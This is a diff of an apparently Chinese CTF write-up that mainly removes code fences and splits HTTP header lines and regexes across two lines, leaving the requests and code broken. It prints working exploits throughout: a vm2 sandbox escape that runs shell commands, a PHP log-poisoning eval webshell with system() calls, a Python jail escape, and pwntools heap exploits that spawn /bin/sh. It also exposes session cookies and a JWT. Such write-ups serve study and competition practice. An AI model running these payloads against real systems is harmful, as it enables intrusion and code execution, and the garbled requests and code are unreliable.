@@ -20,7 +20,8 @@ Steal the cookie and send it to my /cookie?data endpoint
 Once you do, refresh the page to find the flag ;)
 
 GET /cookie?data=connect.sid=s%3AcGeAnOifSb09x6iqcvPva4O3rlWA89NK.9fv3u7LxAZTlz%2FS5fjScJIoZSaAdOlf5bvV4%2FFbP%2F2s HTTP/1.1
-Host: 116.236.144.37:24644
+Host: 116.236.144.37:
+24644
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
@@ -34,7 +35,8 @@ Connection: close
 再发送一次
 
 GET /cookie?data=flag HTTP/1.1
-Host: 116.236.144.37:24644
+Host: 116.236.144.37:
+24644
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
@@ -104,11 +106,13 @@ app.post('/vm2',function  (req, res) {
         for (var i = 0; i < req.session.user.properties.length; i++)
             if (req.session.user.properties[i] == 'vm2_tester') {
                 if (req.body["code"]) {
-                    if (/b(?:function)b/.test(req.body["code"])) {
+                    if (/b(?:
+function)b/.test(req.body["code"])) {
                         res.send("define function not allowed")
                         return;
                     }
-                    if (/b(?:getPrototypeOf)b/.test(req.body["code"])) {
+                    if (/b(?:
+getPrototypeOf)b/.test(req.body["code"])) {
                         res.send("define getPrototypeOf not allowed")
                         return;
                     }
@@ -140,7 +144,8 @@ app.listen(3000, function () {
 这里的vm2用的3.9.16。根据代码分析，先经过/vm2_tester使得 req.session.user.properties = ["vm2_tester"]
 
 POST /vm2_tester HTTP/1.1
-Host: 116.236.144.37:21928
+Host: 116.236.144.37:
+21928
 Pragma: no-cache
 Cache-Control: no-cache
 Upgrade-Insecure-Requests: 1
@@ -163,7 +168,8 @@ Content-Length: 77
 覆盖键length值为vm2_tester。再使用vm2 Sandbox Bypass PoC
 
 POST /vm2 HTTP/1.1
-Host: 116.236.144.37:21928
+Host: 116.236.144.37:
+21928
 Pragma: no-cache
 Cache-Control: no-cache
 Upgrade-Insecure-Requests: 1
@@ -301,15 +307,18 @@ value插入会给编码，key则不会
 username[<?php eval(end(getallheaders()));?>][]=1&password=5555
 
 POST /login.php HTTP/1.1
-Host: 116.236.144.37:26286
+Host: 116.236.144.37:
+26286
 Content-Length: 63
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: http://116.236.144.37:26286
+Origin: http://116.236.144.37:
+26286
 Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://116.236.144.37:26286/1111
+Referer: http://116.236.144.37:
+26286/1111
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Connection: close
@@ -319,16 +328,19 @@ username[<?php eval(end(getallheaders()));?>][]=1&password=5555
 无参数rce
 
 POST /log/21f33ef71f8630f2b9ebd1a1efd24599/202305/20.php?0=ls HTTP/1.1
-Host: 116.236.144.37:26286
+Host: 116.236.144.37:
+26286
 Content-Length: 0
 Pragma: no-cache
 Cache-Control: no-cache
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
-Origin: http://116.236.144.37:26286
+Origin: http://116.236.144.37:
+26286
 Content-Type: application/x-www-form-urlencoded
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://116.236.144.37:26286/log/21f33ef71f8630f2b9ebd1a1efd24599/202305/20.php?0=ls
+Referer: http://116.236.144.37:
+26286/log/21f33ef71f8630f2b9ebd1a1efd24599/202305/20.php?0=ls
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Cookie: rt_web_csrf_token=h0j4zKKzyBSFGDqlawUTxI10GY18LjuQuimHdQXjWbACnA7PiLqaGT1lR8TPrcvd; rt_web__jwt_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiNjg0NTUxYjJkMmFlYTI2N2YwN2I0ZTBlZjk3OTUzMWQiLCJ1c2VybmFtZSI6IjEzNzE3MDc2Nzk0IiwiZXhwIjoxNjg0NjMwMzQ0LCJlbWFpbCI6Im1zMTcwMTBAcXEuY29tIn0.FUUu_riV6Frl975wx4m1g7s6B1yoOY0ETyz9iKYAHBM; connect.sid=s%3AudFceoMASjtPuGXM8jsFUl6OGN8JgSx9.9xoRuuuerb2kM2Sntth3eHpw2kqEiqA7%2FiBfcRDA8Ic
@@ -531,7 +543,7 @@ __int64 __fastcall sub_1EC1(char *a1)
       }
       else
       {
-        puts("CREATE TABLE <TABLE_NAME>");
+        puts("CREATE TABLE ");
         return 0LL;
       }
     }
@@ -557,37 +569,7 @@ __int64 __fastcall sub_1EC1(char *a1)
       }
       else
       {
-        puts("DELETE TABLE <TABLE_NAME");
-        return 0LL;
-      }
-    }
-    else
-    {
-      strcmp(qword_5070, "FROM");
-      if ( qword_5078 && qword_5068 )
-      {
-        delete_column(qword_5078, qword_5068);
-        return 4LL;
-      }
-      else
-      {
-        puts("DELETE COLUMN FROM TABLE");
-        return 0LL;
-      }
-    }
-  }
-  else if ( !strcmp(s1, "SHOW") )
-  {
-    if ( !strcmp(qword_5068, "TABLE") )
-    {
-      if ( qword_5070 )
-      {
-        show(qword_5070);
-        return 5LL;
-      }
-      else
-      {
-        puts("SHOW TABLE <table name>");
+        puts("DELETE TABLE ");
         return 0LL;
       }
     }
@@ -970,21 +952,12 @@ python bwmforpy3.py decode one.png theother.png wm_one.png
 
 ```
 <!-- What? Is your cookie data? Send the data to the cookie. -->
-```
-
-
-
-```
 Steal the cookie and send it to my /cookie?data endpoint
 
 Once you do, refresh the page to find the flag ;)
-```
-
-
-
-```
 GET /cookie?data=connect.sid=s%3AcGeAnOifSb09x6iqcvPva4O3rlWA89NK.9fv3u7LxAZTlz%2FS5fjScJIoZSaAdOlf5bvV4%2FFbP%2F2s HTTP/1.1
-Host: 116.236.144.37:24644
+Host: 116.236.144.37:
+24644
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
@@ -994,13 +967,9 @@ Accept-Language: zh-CN,zh;q=0.9
 Cookie: connect.sid=s%3AcGeAnOifSb09x6iqcvPva4O3rlWA89NK.9fv3u7LxAZTlz%2FS5fjScJIoZSaAdOlf5bvV4%2FFbP%2F2s
 If-None-Match: W/"114-L/TMyoVclBktx7CIK5iqopX89v0"
 Connection: close
-```
-
-
-
-```
 GET /cookie?data=flag HTTP/1.1
-Host: 116.236.144.37:24644
+Host: 116.236.144.37:
+24644
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
@@ -1010,17 +979,7 @@ Accept-Language: zh-CN,zh;q=0.9
 Cookie: connect.sid=s%3AcGeAnOifSb09x6iqcvPva4O3rlWA89NK.9fv3u7LxAZTlz%2FS5fjScJIoZSaAdOlf5bvV4%2FFbP%2F2s
 If-None-Match: W/"114-L/TMyoVclBktx7CIK5iqopX89v0"
 Connection: close
-```
-
-
-
-```
 see `/src`
-```
-
-
-
-```
 const express = require('express');
 const app = express();
 var bodyParser = require('body-parser')
@@ -1072,11 +1031,13 @@ app.post('/vm2',function  (req, res) {
         for (var i = 0; i < req.session.user.properties.length; i++)
             if (req.session.user.properties[i] == 'vm2_tester') {
                 if (req.body["code"]) {
-                    if (/b(?:function)b/.test(req.body["code"])) {
+                    if (/b(?:
+function)b/.test(req.body["code"])) {
                         res.send("define function not allowed")
                         return;
                     }
-                    if (/b(?:getPrototypeOf)b/.test(req.body["code"])) {
+                    if (/b(?:
+getPrototypeOf)b/.test(req.body["code"])) {
                         res.send("define getPrototypeOf not allowed")
                         return;
                     }
@@ -1104,13 +1065,9 @@ app.get('/src', function (req, res) {
 app.listen(3000, function () {
     console.log('start listening on port 3000');
 });
-```
-
-
-
-```
 POST /vm2_tester HTTP/1.1
-Host: 116.236.144.37:21928
+Host: 116.236.144.37:
+21928
 Pragma: no-cache
 Cache-Control: no-cache
 Upgrade-Insecure-Requests: 1
@@ -1129,13 +1086,9 @@ Content-Length: 77
 "length": "vm2_tester"
 }
  }
-```
-
-
-
-```
 POST /vm2 HTTP/1.1
-Host: 116.236.144.37:21928
+Host: 116.236.144.37:
+21928
 Pragma: no-cache
 Cache-Control: no-cache
 Upgrade-Insecure-Requests: 1
@@ -1150,17 +1103,7 @@ Content-Length: 329
 
 {
   "code": "const err = new Error(); err.name = { toString: new Proxy(() => "", { apply(target, thiz, args) { const process = args.constructor.constructor("return process")(); throw process.mainModule.require("child_process").execSync("cat /flag").toString(); }, }), }; try { err.stack; } catch (stdout) { stdout; }"}
-```
-
-
-
-```
 try to request /getflag with base64 param data. This is a springboot program without dependences.
-```
-
-
-
-```
 package com.test;
 
 import com.fasterxml.jackson.databind.node.ArrayNode;
@@ -1247,95 +1190,61 @@ public class App 
         f.set(obj, arg);
     }
 }
-```
-
-
-
-```
 I will logged your ip+uri+input in php file , try to find something in log/958f93db977101f94b2dc1bac9ff6e2e/202305/20.php
-```
-
-
-
-```
 username[<?php eval(end(getallheaders()));?>][]=1&password=5555
-```
-
-
-
-```
 POST /login.php HTTP/1.1
-Host: 116.236.144.37:26286
+Host: 116.236.144.37:
+26286
 Content-Length: 63
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: http://116.236.144.37:26286
+Origin: http://116.236.144.37:
+26286
 Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://116.236.144.37:26286/1111
+Referer: http://116.236.144.37:
+26286/1111
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Connection: close
 
 username[<?php eval(end(getallheaders()));?>][]=1&password=5555
-```
-
-
-
-```
 POST /log/21f33ef71f8630f2b9ebd1a1efd24599/202305/20.php?0=ls HTTP/1.1
-Host: 116.236.144.37:26286
+Host: 116.236.144.37:
+26286
 Content-Length: 0
 Pragma: no-cache
 Cache-Control: no-cache
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
-Origin: http://116.236.144.37:26286
+Origin: http://116.236.144.37:
+26286
 Content-Type: application/x-www-form-urlencoded
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: http://116.236.144.37:26286/log/21f33ef71f8630f2b9ebd1a1efd24599/202305/20.php?0=ls
+Referer: http://116.236.144.37:
+26286/log/21f33ef71f8630f2b9ebd1a1efd24599/202305/20.php?0=ls
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Cookie: rt_web_csrf_token=h0j4zKKzyBSFGDqlawUTxI10GY18LjuQuimHdQXjWbACnA7PiLqaGT1lR8TPrcvd; rt_web__jwt_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiNjg0NTUxYjJkMmFlYTI2N2YwN2I0ZTBlZjk3OTUzMWQiLCJ1c2VybmFtZSI6IjEzNzE3MDc2Nzk0IiwiZXhwIjoxNjg0NjMwMzQ0LCJlbWFpbCI6Im1zMTcwMTBAcXEuY29tIn0.FUUu_riV6Frl975wx4m1g7s6B1yoOY0ETyz9iKYAHBM; connect.sid=s%3AudFceoMASjtPuGXM8jsFUl6OGN8JgSx9.9xoRuuuerb2kM2Sntth3eHpw2kqEiqA7%2FiBfcRDA8Ic
 Connection: close
 Tao: system('cat /S3rect_1S_H3re');
-```
-
-
-
-```
 #!/usr/bin/env python3
 
-#print(''.__class__.__base__.__subclasses__())
-#print(dir(''.__class__.__base__.__subclasses__()[124].__init__.__globals__['x5fx5fx62x75x69x6cx74x69x6ex73x5fx5f']['x65x76x61x6c']()))
+    #print(''.__class__.__base__.__subclasses__())
+    #print(dir(''.__class__.__base__.__subclasses__()[124].__init__.__globals__['x5fx5fx62x75x69x6cx74x69x6ex73x5fx5f']['x65x76x61x6c']()))
 
 # find flag file
 print(''.__class__.__base__.__subclasses__()[124].__init__.__globals__['x5fx5fx62x75x69x6cx74x69x6ex73x5fx5f']['x65x76x61x6c'](')(daer.)"galf eman- / dnif"(nepop.)"so"(__tropmi__'[::-1]))
 
 # read flag
 print(''.__class__.__base__.__subclasses__()[118].get_data(0, "/usr/src/app/flag"))
-```
-
-
-
-```
 p.sendlineafter("Input the first key: ",str((-2**63) + 0xc))
 p.sendlineafter("Input the second key: ",str(1))
-```
-
-
-
-```
 add(0x10,"AAAA") #chunk0 修改下面的chunk的size,改为0x431
 add(0x400,"AAAA") #chunk1 将该chunk释放，进入unsorted chunk
 add(0x10,"AAAAA") #chunk2 
 add(0x10,"AAA") #chunk3
-```
-
-
-
-```
 edit(0,p64(0)*3+p64(0x431))
 dele(1)
 
@@ -1348,23 +1257,13 @@ dele(2) # 再释放chunk2，这样子chunk2的位置就会有指向chunk3的�
 show()
 p.recvuntil("4 : ")
 heap_addr = u64(p.recvuntil("n")[:-1].ljust(0x8,b"x00")) - 0x450 - 0x20 # 计算v9指向的堆块的位置
-```
-
-
-
-```
 edit(4,p64(heap_addr))
 add(0x10,"AAA")
 add(0x10,p64(0)+p64(backdoor))
-```
-
-
-
-```
 from pwn import*
 context(arch='amd64', os='linux',log_level="debug")
 context.terminal=["wt.exe","wsl.exe"]
-#libc = ELF("../libc/")
+    #libc = ELF("../libc/")
 # libc = ELF("./libc-so.6")
 """""
 def xxx():
@@ -1427,11 +1326,6 @@ add(0x10,p64(0)+p64(backdoor))
 # gdb.attach(p,"")
 p.sendlineafter("Your choice:",'5')
 p.interactive()
-```
-
-
-
-```
 __int64 __fastcall sub_1EC1(char *a1)
 {
   sub_1E84();
@@ -1447,7 +1341,7 @@ __int64 __fastcall sub_1EC1(char *a1)
       }
       else
       {
-        puts("CREATE TABLE <TABLE_NAME>");
+        puts("CREATE TABLE ");
         return 0LL;
       }
     }
@@ -1473,37 +1367,7 @@ __int64 __fastcall sub_1EC1(char *a1)
       }
       else
       {
-        puts("DELETE TABLE <TABLE_NAME");
-        return 0LL;
-      }
-    }
-    else
-    {
-      strcmp(qword_5070, "FROM");
-      if ( qword_5078 && qword_5068 )
-      {
-        delete_column(qword_5078, qword_5068);
-        return 4LL;
-      }
-      else
-      {
-        puts("DELETE COLUMN FROM TABLE");
-        return 0LL;
-      }
-    }
-  }
-  else if ( !strcmp(s1, "SHOW") )
-  {
-    if ( !strcmp(qword_5068, "TABLE") )
-    {
-      if ( qword_5070 )
-      {
-        show(qword_5070);
-        return 5LL;
-      }
-      else
-      {
-        puts("SHOW TABLE <table name>");
+        puts("DELETE TABLE ");
         return 0LL;
       }
     }
@@ -1538,22 +1402,12 @@ __int64 __fastcall sub_1EC1(char *a1)
     return 0LL;
   }
 }
-```
-
-
-
-```
 struct column{
     char name[0x10];
     column* fb;
     table* belong;
     char* Field;
 }
-```
-
-
-
-```
 add(mode = 0,table="AAAA")
 add("A","AAAA")
 add(mode = 0,table="CCCC")
@@ -1561,11 +1415,6 @@ add(mode = 0,table="BBBB")
 add("b","BBBB")
 dele(mode = 0,table="CCCC")
 add("b","AAAA")
-```
-
-
-
-```
 dele("b","AAAA") #这里倒着释放就是为了我们后面申请回来的时候，是跟释放前的布局一样的
 dele("A","AAAA")
 
@@ -1575,18 +1424,8 @@ show("AAAA")
 p.recvuntil("Content: ")
 heap_addr = u64(p.recvuntil("n")[:-1].ljust(8,b"x00"))
 print(hex(heap_addr))
-```
-
-
-
-```
 edit("A","AAAA","A"*0x10,b"A"*0xc0+p64(0)+p64(0x111)+p64(0)*2) # 将Column的fd后一位置为零
 dele(table="AAAA",mode=0)
-```
-
-
-
-```
 add(mode = 0,table="CCCC")
 add("b","CCCC")
 
@@ -1600,37 +1439,17 @@ dele(table="BBBB",mode=0)
 
 edit("b","CCCC","b","A"*0xd0)
 show("CCCC")
-```
-
-
-
-```
 payload = b"A"*0x30 + p64(0) + p64(0x31) + b"A"*0x20 + p64(0)+p64(0x31) + p64(0)+b"A"*0x18 + p64(0)+p64(0x31) + b"A"*0x20 +p64(0) + p64(0x111)
 edit("b","CCCC","b",payload)
-```
-
-
-
-```
 add(mode = 0,table="BBBB")
 for i in range(7):
     add(chr(0x43+i),"BBBB")
 
 dele(chr(0x43+5),"BBBB")
 dele(chr(0x43+6),"BBBB")
-```
-
-
-
-```
 add(mode = 0,table="/bin/shx00")
 add(mode = 0,table=p64(libc.sym['system']))
 dele(mode = 0,table="/bin/sh")
-```
-
-
-
-```
 from pwn import*
 context(arch='i386', os='linux',log_level="debug")
 context.terminal=["wt.exe","wsl.exe"]
@@ -1735,11 +1554,6 @@ dele(mode = 0,table="/bin/sh")
 
 # gdb.attach(p,"")
 p.interactive()
-```
-
-
-
-```
 import base64
 
 def KSA(key):
